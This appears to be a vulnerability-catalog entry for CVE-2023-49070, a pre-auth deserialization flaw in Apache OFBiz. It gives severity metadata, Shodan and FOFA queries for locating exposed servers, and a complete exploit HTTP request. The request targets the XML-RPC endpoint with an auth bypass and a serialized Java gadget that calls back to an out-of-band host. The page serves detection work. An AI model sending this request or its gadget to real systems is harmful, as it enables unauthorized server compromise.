---
layout: post
cve_id: CVE-2023-49070
title: Apache OFBiz < 18.12.10 - Arbitrary Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-49070.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-49070.yaml
snort2_rule: N/A
snort3_rule: N/A
author: your3cho
severity: critical
impact: 'Unauthenticated attackers can exploit unmaintained XML-RPC functionality
  to execute arbitrary code through Java deserialization, enabling complete server
  compromise.

  '
remediation: Users are recommended to upgrade to version 18.12.10.
reference:
- https://lists.apache.org/thread/jmbqk2lp4t4483whzndp5xqlq4f3otg3
- https://seclists.org/oss-sec/2023/q4/257
- https://twitter.com/Siebene7/status/1731870759130427726
- https://nvd.nist.gov/vuln/detail/CVE-2023-49070
- https://issues.apache.org/jira/browse/OFBIZ-12812
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-49070
  cwe-id: CWE-94
  epss-score: 0.9396
  epss-percentile: 0.99875
  cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: ofbiz
  shodan-query:
  - html:"OFBiz"
  - http.html:"ofbiz"
  - ofbiz.visitor=
  fofa-query:
  - app="Apache_OFBiz"
  - body="ofbiz"
  - app="apache_ofbiz"
tags:
- cve
- cve2023
- seclists
- apache
- ofbiz
- deserialization
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Pre-auth RCE in Apache Ofbiz 18.12.09. It's due to XML-RPC no longer maintained still present. This issue affects Apache OFBiz: before 18.12.10.


## ðŸŒ HTTP Request
```nohighlight
POST /webtools/control/xmlrpc;/?USERNAME&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Connection: close
Content-Length: 881
Content-Type: application/xml
Accept-Encoding: gzip

<?xml version="1.0"?>
  <methodCall>
    <methodName>38F1caKjvL8y8Qq3WBjJmJkcZSZ</methodName>
    <params>
      <param>
      <value>
        <struct>
       <member>
          <name>test</name>
          <value>
      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAKmQ1amxoYTFsZTBvMjduMjh0aGdnNnJubmJhMWMxZGNrNi5vYXN0LnByb3QAAHEAfgAFdAAEaHR0cHB4dAAxaHR0cDovL2Q1amxoYTFsZTBvMjduMjh0aGdnNnJubmJhMWMxZGNrNi5vYXN0LnByb3g=</serializable>
          </value>
        </member>
      </struct>
      </value>
    </param>
    </params>
</methodCall>
```

